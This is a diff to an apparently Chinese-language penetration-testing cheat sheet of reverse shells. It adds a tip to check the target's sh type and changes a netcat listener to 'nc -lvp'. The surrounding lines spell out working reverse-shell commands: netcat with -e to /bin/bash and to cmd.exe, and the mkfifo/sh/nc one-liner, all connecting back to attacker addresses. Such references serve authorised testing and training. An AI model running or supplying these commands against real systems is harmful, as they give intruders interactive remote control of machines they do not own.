@@ -61,6 +61,13 @@ socat正向shell
 常用反弹shell
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+- 各种shell
+
+::
+
+	注：需区分服务器的sh类型，可使用which sh查询。
+	不同的sh，影响不同的反向shell是否可以成功。
+
 - bash反向shell
 
 ::
@@ -125,7 +132,7 @@ socat正向shell
 
 ::
 
-	client(vps)：nc -l 1567
+	client(vps)：nc -lvp 1567
 	server：nc 172.31.100.7 1567 -e /bin/bash
 	server：nc 192.168.174.130 9999 -e c:\windows\system32\cmd.exe
 	server：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.174.130 4444 >/tmp/f
